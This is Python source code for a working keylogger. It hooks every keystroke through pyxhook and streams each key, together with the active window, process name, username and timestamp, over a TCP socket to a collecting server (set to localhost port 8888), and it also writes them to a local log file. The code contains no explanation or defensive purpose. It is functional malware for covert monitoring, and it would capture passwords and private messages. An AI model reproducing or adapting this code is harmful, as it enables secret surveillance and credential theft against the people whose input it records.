import time 
import socket
import logging
import os 
import pwd
import datetime

from Hook import pyxhook

logging.basicConfig(filename="kl.log",level=logging.DEBUG)
logger=logging.getLogger(__name__)

host = 'localhost'
port = 8888
size = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host,port))
    logger.info('connection complete')
except:
    logger.exception('could not connect to server')

def kbevent( event ):
    #send key info
    s.send(event.Key+ '||' + event.WindowName + '||' + event.WindowProcName + '||' + pwd.getpwuid(os.getuid()).pw_name + '||' + str(datetime.datetime.now()))
    logger.info(" key pressed " + event.Key + event.WindowName + event.WindowProcName + pwd.getpwuid(os.getuid()).pw_name + str(datetime.datetime.now()) )

#Create hookmanager
hookman = pyxhook.HookManager()
#Define our callback to fire when a key is pressed down

hookman.KeyDown = kbevent
#Hook the keyboard

hookman.HookKeyboard()
#Start our listener
hookman.start()


#Create a loop to keep the application running
running = True
while running:
    time.sleep(0.1)
#Close the listener when we are done
hookman.cancel()
